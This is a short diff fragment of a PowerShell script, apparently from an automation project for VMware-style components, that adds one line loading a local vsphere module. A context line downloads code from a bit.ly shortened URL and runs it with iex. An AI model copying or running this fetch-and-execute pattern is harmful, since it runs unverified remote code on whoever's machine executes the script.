@@ -641,6 +641,7 @@ Param (
 
 . .\utils.ps1
 . .\view\broker\object.ps1
+. .\vsphere\object.ps1
 $web = new-object net.webclient
 iex $web.downloadstring('http://bit.ly/1Je9cuh') # windows\object.ps1
 
